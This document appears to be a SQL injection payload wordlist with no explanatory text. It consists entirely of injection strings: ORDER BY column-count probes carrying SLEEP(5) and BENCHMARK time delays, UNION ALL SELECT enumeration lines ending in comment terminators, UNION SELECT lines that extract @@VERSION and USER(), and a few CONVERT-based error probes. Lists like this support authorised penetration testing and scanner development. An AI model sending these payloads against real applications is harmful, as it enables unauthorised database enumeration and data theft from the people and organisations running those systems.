 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 ORDER BY SLEEP(5)#
 ORDER BY 1,SLEEP(5)#
 ORDER BY 1,SLEEP(5),3#
 ORDER BY 1,SLEEP(5),3,4#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
 ORDER BY SLEEP(5)-- 
 ORDER BY 1,SLEEP(5)-- 
 ORDER BY 1,SLEEP(5),3-- 
 ORDER BY 1,SLEEP(5),3,4-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
 UNION ALL SELECT 1
 UNION ALL SELECT 1,2
 UNION ALL SELECT 1,2,3
 UNION ALL SELECT 1,2,3,4
 UNION ALL SELECT 1,2,3,4,5
 UNION ALL SELECT 1,2,3,4,5,6
 UNION ALL SELECT 1,2,3,4,5,6,7
 UNION ALL SELECT 1,2,3,4,5,6,7,8
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 UNION ALL SELECT 1#
 UNION ALL SELECT 1,2#
 UNION ALL SELECT 1,2,3#
 UNION ALL SELECT 1,2,3,4#
 UNION ALL SELECT 1,2,3,4,5#
 UNION ALL SELECT 1,2,3,4,5,6#
 UNION ALL SELECT 1,2,3,4,5,6,7#
 UNION ALL SELECT 1,2,3,4,5,6,7,8#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
 UNION ALL SELECT 1-- 
 UNION ALL SELECT 1,2-- 
 UNION ALL SELECT 1,2,3-- 
 UNION ALL SELECT 1,2,3,4-- 
 UNION ALL SELECT 1,2,3,4,5-- 
 UNION ALL SELECT 1,2,3,4,5,6-- 
 UNION ALL SELECT 1,2,3,4,5,6,7-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
 UNION SELECT @@VERSION,SLEEP(5),3
 UNION SELECT @@VERSION,SLEEP(5),USER(),4
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 UNION SELECT @@VERSION,SLEEP(5),"'3
 UNION SELECT @@VERSION,SLEEP(5),"'3'"#
 UNION SELECT @@VERSION,SLEEP(5),USER(),4#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
 UNION ALL SELECT USER()-- 
 UNION ALL SELECT SLEEP(5)-- 
 UNION ALL SELECT USER(),SLEEP(5)-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT NULL-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- 
